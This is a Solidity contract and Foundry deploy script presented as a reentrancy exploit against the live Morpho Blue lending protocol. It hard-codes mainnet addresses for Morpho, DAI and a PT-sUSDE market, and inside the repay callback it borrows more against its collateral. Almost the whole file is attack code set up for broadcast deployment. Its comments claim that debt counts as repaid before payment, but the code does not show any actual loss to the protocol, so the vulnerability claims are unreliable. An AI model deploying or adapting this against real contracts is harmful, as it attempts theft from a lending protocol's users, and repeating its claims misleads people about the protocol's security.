// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {IMorpho, MarketParams, Id} from "../lib/morpho-blue/src/interfaces/IMorpho.sol";
import {IMorphoRepayCallback} from "../lib/morpho-blue/src/interfaces/IMorphoCallbacks.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MorphoReentrancyDemo is IMorphoRepayCallback {
    IMorpho public immutable morpho = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    // Market tokens
    address public immutable collateralToken = 0xE00bd3Df25fb187d6ABBB620b3dfd19839947b81; // PT-sUSDE-27MAR2025
    address public immutable loanToken = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI

    // Attack control
    bool public attacking = false;

    // Predefined market parameters
    MarketParams public marketParams = MarketParams({
        loanToken: 0x6B175474E89094C44Da98b954EedeAC495271d0F,
        collateralToken: 0xE00bd3Df25fb187d6ABBB620b3dfd19839947b81,
        oracle: 0x38d130cEe60CDa080A3b3aC94C79c34B6Fc919A7,
        irm: 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC,
        lltv: 0.915e18
    });

    // Step 1: Setup a position (normally would be done before attack)
    function setupPosition(uint256 collateralAmount) external {
        // Approve and supply collateral
        IERC20(collateralToken).approve(address(morpho), collateralAmount);
        morpho.supplyCollateral(marketParams, collateralAmount, address(this), "");

        // Borrow some DAI (80% of max)
        uint256 borrowAmount = (collateralAmount * 98 * 80) / (100 * 100);
        morpho.borrow(marketParams, borrowAmount, 0, address(this), address(this));
    }

    // Step 2: Execute the attack
    function executeAttack() external {
        // Get current borrowed amount
        (,uint128 borrowShares,) = morpho.position(marketParams.id(), address(this));
        (,,uint128 totalBorrowAssets, uint128 totalBorrowShares,,) = morpho.market(marketParams.id());

        // Calculate assets to repay
        uint256 repayAmount = (uint256(borrowShares) * uint256(totalBorrowAssets)) / uint256(totalBorrowShares);

        // Approve for repayment
        IERC20(loanToken).approve(address(morpho), repayAmount);

        // Execute attack
        attacking = true;
        morpho.repay(marketParams, repayAmount, 0, address(this), abi.encode("EXPLOIT"));
        attacking = false;
    }

    // This is where the reentrancy happens
    function onMorphoRepay(uint256 assets, bytes calldata) external override {
        if (attacking && msg.sender == address(morpho)) {
            // At this point, our debt is considered repaid in the contract state,
            // but we haven't actually transferred the tokens yet

            // Get our collateral amount
            (,,uint128 collateralBalance) = morpho.position(marketParams.id(), address(this));

            // Calculate max borrow (90% of max possible)
            uint256 maxBorrowAmount = (uint256(collateralBalance) * 98 * 915 * 90) / (100 * 1000 * 100);

            // Borrow more than we're repaying
            morpho.borrow(marketParams, maxBorrowAmount, 0, address(this), address(this));
        }
    }
}

contract DeployMorphoVulberability is Script {
    function run() external {
        vm.startBroadcast();

        // Deploy the exploit contract
        MorphoReentrancyDemo exploit = new MorphoReentrancyDemo();

        // These would be called separately after acquiring tokens
        // exploit.setupPosition(1_000_000 * 10**18);
        // exploit.executeAttack();

        vm.stopBroadcast();
    }
}